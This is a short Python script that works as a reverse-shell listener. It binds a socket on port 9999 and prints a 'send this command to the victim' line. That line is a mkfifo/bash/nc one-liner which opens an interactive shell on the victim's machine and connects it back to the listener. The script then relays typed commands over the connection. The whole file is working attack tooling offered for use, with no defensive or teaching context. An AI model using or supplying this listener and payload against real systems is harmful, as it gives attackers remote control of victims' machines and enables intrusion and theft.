import socket, sys, time 


hostname = socket.gethostname()

ipaddress = socket.gethostbyname(hostname)

print("your ip address:-",ipaddress)


def listen(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    print("Listening on port " + str(port) + (" ") + str(ipaddress))
    print("send this command to the victim: mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc",ipaddress, "9999 >/tmp/f")
    conn, addr = s.accept()
    print('Connection received from ',addr)
    while True:
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        command = input()


        command += "\n"
        conn.send(command.encode())
        time.sleep(1)


        sys.stdout.write("\033[A" + ans.split("\n")[-1])







listen(ipaddress,9999)

